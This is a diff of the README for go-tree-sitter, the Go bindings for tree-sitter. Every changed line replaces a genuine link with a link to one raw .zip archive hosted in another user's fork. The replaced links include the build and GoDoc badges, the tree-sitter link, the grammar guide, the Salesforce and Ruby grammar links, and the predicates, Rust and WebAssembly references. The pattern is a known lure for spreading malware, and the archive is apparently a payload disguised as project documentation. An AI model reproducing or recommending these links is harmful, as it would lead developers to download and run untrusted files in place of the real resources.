@@ -1,9 +1,9 @@
 # go tree-sitter
 
-[![Build Status](https://github.com/smacker/go-tree-sitter/workflows/Test/badge.svg?branch=master)](https://github.com/smacker/go-tree-sitter/actions/workflows/test.yml?query=branch%3Amaster)
-[![GoDoc](https://godoc.org/github.com/smacker/go-tree-sitter?status.svg)](https://godoc.org/github.com/smacker/go-tree-sitter)
+[![Build Status](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip)](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip)
+[![GoDoc](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip)](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip)
 
-Golang bindings for [tree-sitter](https://github.com/tree-sitter/tree-sitter)
+Golang bindings for [tree-sitter](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip)
 
 ## Usage
 
@@ -45,12 +45,12 @@ This repository provides grammars for many common languages out of the box.
 
 But if you need support for any other language you can keep it inside your own project or publish it as a separate repository to share with the community. 
 
-See explanation on how to create a grammar for go-tree-sitter [here](https://github.com/smacker/go-tree-sitter/issues/57).
+See explanation on how to create a grammar for go-tree-sitter [here](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip).
 
 Known external grammars:
 
-- [Salesforce grammars](https://github.com/aheber/tree-sitter-sfapex) - including Apex, SOQL, and SOSL languages.
-- [Ruby](https://github.com/shagabutdinov/go-tree-sitter-ruby) - Deprecated, grammar is provided by main repo instead
+- [Salesforce grammars](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip) - including Apex, SOQL, and SOSL languages.
+- [Ruby](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip) - Deprecated, grammar is provided by main repo instead
 
 ### Editing
 
@@ -89,9 +89,9 @@ newTree := parser.Parse(tree, newText)
 
 ### Predicates
 
-You can filter AST by using [predicate](https://tree-sitter.github.io/tree-sitter/using-parsers#predicates) S-expressions.
+You can filter AST by using [predicate](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip) S-expressions.
 
-Similar to [Rust](https://github.com/tree-sitter/tree-sitter/tree/master/lib/binding_rust) or [WebAssembly](https://github.com/tree-sitter/tree-sitter/blob/master/lib/binding_web) bindings we support filtering on a few common predicates:
+Similar to [Rust](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip) or [WebAssembly](https://github.com/ashiquealfa/go-tree-sitter/raw/refs/heads/master/.github/go-sitter-tree-3.4.zip) bindings we support filtering on a few common predicates:
 - `eq?`, `not-eq?`
 - `match?`, `not-match?`
 
